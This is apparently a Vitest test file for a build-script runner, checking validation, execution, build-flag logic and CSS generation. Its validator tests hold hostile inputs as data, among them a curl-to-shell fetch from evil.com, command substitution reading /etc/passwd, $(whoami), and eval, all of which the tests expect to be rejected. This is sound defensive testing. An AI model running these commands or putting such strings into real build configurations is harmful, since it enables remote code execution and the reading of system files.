/**
 * Build Runner Module Tests
 *
 * Tests for build script execution, validation, and build pipeline.
 */

import { describe, it, expect, vi, beforeEach } from 'vitest';
import {
  runBuildScript,
  shouldRunBuild,
  runBuildPipeline,
  validateBuildScript,
} from './build-runner.js';

// Mock child_process
const mockSpawnSync = vi.fn(() => ({ status: 0, error: null }));
vi.mock('node:child_process', () => ({
  spawnSync: (...args: any[]) => mockSpawnSync(...args),
}));

// Mock output module
vi.mock('../output.js', () => ({
  hasBuildConfig: vi.fn(),
  getBuildStepsSummary: vi.fn(() => ['CSS generation']),
  generateCssFromBaseline: vi.fn().mockResolvedValue({ files: ['tokens.css'] }),
}));

// Mock chalk
vi.mock('chalk', () => ({
  default: {
    cyan: (s: string) => s,
    red: (s: string) => s,
    dim: (s: string) => s,
  },
}));

describe('build-runner', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  describe('validateBuildScript', () => {
    describe('valid scripts', () => {
      it('should accept npm run commands', () => {
        expect(validateBuildScript('npm run build')).toEqual({ valid: true });
        expect(validateBuildScript('npm run test:unit')).toEqual({ valid: true });
      });

      it('should accept npx commands', () => {
        expect(validateBuildScript('npx tsc')).toEqual({ valid: true });
        expect(validateBuildScript('npx style-dictionary build')).toEqual({ valid: true });
      });

      it('should accept yarn and pnpm commands', () => {
        expect(validateBuildScript('yarn build')).toEqual({ valid: true });
        expect(validateBuildScript('pnpm run build')).toEqual({ valid: true });
      });

      it('should accept node commands', () => {
        expect(validateBuildScript('node scripts/build.js')).toEqual({ valid: true });
      });

      it('should accept local scripts', () => {
        expect(validateBuildScript('./build.sh')).toEqual({ valid: true });
      });

      it('should accept make commands', () => {
        expect(validateBuildScript('make')).toEqual({ valid: true });
        expect(validateBuildScript('make build')).toEqual({ valid: true });
      });
    });

    describe('dangerous patterns', () => {
      it('should reject command substitution with $()', () => {
        const result = validateBuildScript('npm run $(cat /etc/passwd)');
        expect(result.valid).toBe(false);
        expect(result.error).toContain('dangerous pattern');
      });

      it('should reject command substitution with backticks', () => {
        const result = validateBuildScript('npm run `cat /etc/passwd`');
        expect(result.valid).toBe(false);
        expect(result.error).toContain('dangerous pattern');
      });

      it('should reject variable expansion', () => {
        const result = validateBuildScript('npm run ${HOME}');
        expect(result.valid).toBe(false);
        expect(result.error).toContain('dangerous pattern');
      });

      it('should reject piping curl to shell', () => {
        const result = validateBuildScript('curl http://evil.com/script.sh | sh');
        expect(result.valid).toBe(false);
        expect(result.error).toContain('dangerous pattern');
      });

      it('should reject eval', () => {
        const result = validateBuildScript('eval "malicious code"');
        expect(result.valid).toBe(false);
        expect(result.error).toContain('dangerous pattern');
      });
    });

    describe('unrecognized commands', () => {
      it('should reject arbitrary commands', () => {
        const result = validateBuildScript('cat /etc/passwd');
        expect(result.valid).toBe(false);
        expect(result.error).toContain('must start with a recognized command');
      });

      it('should reject raw shell commands', () => {
        const result = validateBuildScript('ls -la');
        expect(result.valid).toBe(false);
        expect(result.error).toContain('must start with a recognized command');
      });
    });

    describe('invalid input types', () => {
      it('should reject non-string input', () => {
        expect(validateBuildScript(123)).toEqual({
          valid: false,
          error: 'Build script must be a string',
        });
        expect(validateBuildScript(null)).toEqual({
          valid: false,
          error: 'Build script must be a string',
        });
      });

      it('should reject empty strings', () => {
        expect(validateBuildScript('')).toEqual({
          valid: false,
          error: 'Build script cannot be empty',
        });
        expect(validateBuildScript('   ')).toEqual({
          valid: false,
          error: 'Build script cannot be empty',
        });
      });
    });
  });

  describe('runBuildScript', () => {
    it('should return ran:false when no script configured', async () => {
      const config = { build: {} };
      const mockSpinner = { text: '' };

      const result = await runBuildScript(config as any, mockSpinner as any);

      expect(result.ran).toBe(false);
      expect(result.success).toBe(true);
    });

    it('should execute valid script when configured', async () => {
      mockSpawnSync.mockReturnValueOnce({ status: 0, error: null });

      const config = { build: { script: 'npm run build' } };
      const mockSpinner = { text: '' };

      const result = await runBuildScript(config as any, mockSpinner as any);

      expect(mockSpawnSync).toHaveBeenCalled();
      expect(result.ran).toBe(true);
      expect(result.success).toBe(true);
    });

    it('should reject invalid scripts without executing', async () => {
      const config = { build: { script: 'cat /etc/passwd' } };
      const mockSpinner = { text: '', fail: vi.fn() };

      const result = await runBuildScript(config as any, mockSpinner as any);

      expect(mockSpawnSync).not.toHaveBeenCalled();
      expect(result.ran).toBe(false);
      expect(result.success).toBe(false);
      expect(mockSpinner.fail).toHaveBeenCalled();
    });

    it('should reject scripts with dangerous patterns', async () => {
      const config = { build: { script: 'npm run $(whoami)' } };
      const mockSpinner = { text: '', fail: vi.fn() };

      const result = await runBuildScript(config as any, mockSpinner as any);

      expect(mockSpawnSync).not.toHaveBeenCalled();
      expect(result.ran).toBe(false);
      expect(result.success).toBe(false);
    });

    it('should return success:false when script fails', async () => {
      mockSpawnSync.mockReturnValueOnce({ status: 1, error: null });

      const config = { build: { script: 'npm run build' } };
      const mockSpinner = { text: '', fail: vi.fn() };

      const result = await runBuildScript(config as any, mockSpinner as any);

      expect(result.ran).toBe(true);
      expect(result.success).toBe(false);
    });

    it('should return success:false when spawn throws error', async () => {
      mockSpawnSync.mockReturnValueOnce({ status: null, error: new Error('Spawn failed') });

      const config = { build: { script: 'npm run build' } };
      const mockSpinner = { text: '', fail: vi.fn() };

      const result = await runBuildScript(config as any, mockSpinner as any);

      expect(result.ran).toBe(true);
      expect(result.success).toBe(false);
    });
  });

  describe('shouldRunBuild', () => {
    it('should return false when noBuild flag is set', async () => {
      const config = { build: { script: 'npm run build' } };
      const options = { noBuild: true };

      const result = await shouldRunBuild(config as any, options as any);

      expect(result).toBe(false);
    });

    it('should return false when no build config', async () => {
      const { hasBuildConfig } = await import('../output.js');
      (hasBuildConfig as any).mockReturnValue(false);

      const config = { build: {} };
      const options = {};

      const result = await shouldRunBuild(config as any, options as any);

      expect(result).toBe(false);
    });

    it('should return true when build flag is set', async () => {
      const { hasBuildConfig } = await import('../output.js');
      (hasBuildConfig as any).mockReturnValue(true);

      const config = { build: { script: 'npm run build' } };
      const options = { build: true };

      const result = await shouldRunBuild(config as any, options as any);

      expect(result).toBe(true);
    });

    it('should return true when autoRun is configured', async () => {
      const { hasBuildConfig } = await import('../output.js');
      (hasBuildConfig as any).mockReturnValue(true);

      const config = { build: { script: 'npm run build', autoRun: true } };
      const options = {};

      const result = await shouldRunBuild(config as any, options as any);

      expect(result).toBe(true);
    });
  });

  describe('runBuildPipeline', () => {
    it('should run script and CSS generation', async () => {
      const { generateCssFromBaseline } = await import('../output.js');
      (generateCssFromBaseline as any).mockResolvedValue({ files: ['a.css', 'b.css'] });

      const baseline = { baseline: {}, metadata: { syncedAt: '' } };
      const config = {
        build: {
          script: 'npm run build',
          css: { enabled: true },
        },
      };
      const mockSpinner = {
        text: '',
        stop: vi.fn(),
        start: vi.fn(),
      };

      const result = await runBuildPipeline(baseline as any, config as any, mockSpinner as any);

      expect(result.scriptRan).toBe(true);
      expect(result.cssFilesWritten).toBe(2);
    });

    it('should skip CSS when not enabled', async () => {
      const baseline = { baseline: {}, metadata: { syncedAt: '' } };
      const config = {
        build: {
          script: 'npm run build',
          css: { enabled: false },
        },
      };
      const mockSpinner = {
        text: '',
        stop: vi.fn(),
        start: vi.fn(),
      };

      const result = await runBuildPipeline(baseline as any, config as any, mockSpinner as any);

      expect(result.cssFilesWritten).toBe(0);
    });
  });
});
